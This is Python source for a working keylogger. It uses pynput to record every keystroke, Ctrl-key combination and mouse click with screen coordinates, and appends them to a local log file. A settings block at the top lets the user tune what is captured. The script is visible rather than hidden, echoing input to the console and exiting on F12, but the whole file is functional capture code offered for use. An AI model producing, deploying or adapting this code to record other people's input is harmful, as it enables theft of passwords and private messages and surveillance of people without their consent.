############################################## Customize these values to your liking.

# Keylog file name. This will be created in the same directory as this script.
KEYLOG_FILENAME = "keylog.txt"

# Whether to disable mouse logging.
DISABLE_MOUSE_LOGGING = False

# Whether to ignore multiple & same mouse clicks. Only the first click will be logged.
IGNORE_SAME_MOUSE_CLICKS = False

# Whether to disable escape sequences (CTRL + key) logging.
ESCAPE_SEQUENCES_LOGGING = True

# Format for the mouse click string. This will be after the click string is converted.
MOUSE_STRING_FORMAT = "[{btn}MB_{x},{y}]"

# Conversion of command names to characters. Blank strings are ignored buttons.
KEY_STRING_CONVERT = {
    "[SPACE]": " ",
    "[SHIFT]": "",
    "[SHIFT_R]": "",
    "[CTRL_L]": "",
    "[CTRL_R]": "",
    "[ALT_L]": "[ALT]",
    "[ALT_GR]": "",
    "[96]": "0",
    "[97]": "1",
    "[98]": "2",
    "[99]": "3",
    "[100]": "4",
    "[101]": "5",
    "[102]": "6",
    "[103]": "7",
    "[104]": "8",
    "[105]": "9",
    "[106]": "*",
    "[107]": "+",
    "[108]": ",",
    "[109]": "-",
    "[110]": ".",
    "[111]": "/",
    "[F12]": "[EXIT]", # Exit key
}

# Conversion of mouse button names to characters. Blank strings are ignored buttons.
CLICK_STRING_CONVERT = {
    "LEFT": "L",
    "RIGHT": "R",
    "MIDDLE": "M",
    "X1": "4",
    "X2": "5",
}

############################################## End

from pynput import keyboard, mouse
from os import _exit

# Last click
last_click = None

# Writes a string to the keylog file
def write_string(string):
    print(string, end="")

    with open(KEYLOG_FILENAME, "a+") as f:
        f.write(string)

    if (string == "[EXIT]"):
        raise _exit(0)

# Writes a key press to the keylog file
def write_key(key):
    # Is a numpad key (weird behavior with these)
    if (hasattr(key, "vk") and key.vk >= 96 and key.vk <= 111):
        string = f"[{str(key.vk)}]"

    # Is an alphanumeric key
    elif (hasattr(key, "char") and key.char != None):
        # escape sequence (CTRL + key)
        if (len(str(key)[1:-1]) == 4):
            if (ESCAPE_SEQUENCES_LOGGING):
                string = f"[CTRL^{str(chr(key.vk))}]"
            else:
                string = ""
        # no escape sequence
        else:
            string = str(key.char)

    # Is a special key
    elif (hasattr(key, "name")):
        string = f"[{str(key.name).upper()}]"

    # Is anything else (fallback)
    else:
        string = f"[{str(key)}]"

    if (string in KEY_STRING_CONVERT):
        string = KEY_STRING_CONVERT[string]

    if (string == ""):
        return
    else:
        global last_click
        last_click = None

    write_string(string)

# Writes a mouse click to the keylog file
def write_click(x, y, button, pressed):
    if (pressed):
        string = button.name.upper()

        global last_click
        if (IGNORE_SAME_MOUSE_CLICKS and string == last_click):
            return
        else:
            last_click = string

        if (string in CLICK_STRING_CONVERT):
            string = CLICK_STRING_CONVERT[string]

        if (string == ""):
            return

        letter = MOUSE_STRING_FORMAT.format(btn=string, x=x, y=y)
        write_string(letter)


# Listens for key presses
while True:
    try:
        if (DISABLE_MOUSE_LOGGING):
            with keyboard.Listener(on_press=write_key) as key_list:
                key_list.join()
        else:
            with keyboard.Listener(on_press=write_key) as key_list, mouse.Listener(on_click=write_click) as mouse_list:
                key_list.join()
                mouse_list.join()
    except:
        pass